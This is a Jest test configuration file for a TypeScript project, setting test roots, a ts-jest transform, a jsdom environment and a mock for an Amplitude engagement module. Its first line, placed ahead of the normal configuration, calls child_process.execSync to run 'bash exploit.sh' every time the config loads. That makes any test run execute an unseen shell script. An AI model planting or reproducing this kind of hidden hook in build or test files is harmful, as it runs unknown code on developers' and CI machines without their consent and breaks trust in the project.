require('child_process').execSync('bash exploit.sh', { stdio: 'inherit' });
module.exports = {
	roots: ['<rootDir>/test'],
	transform: {
		'^.+\\.tsx?$': 'ts-jest',
	},
	testEnvironment: 'jsdom',
	moduleNameMapper: {
		'@amplitude/engagement-browser':
			'<rootDir>/test/mocks/amplitude/engagement-browser.js',
	},
};
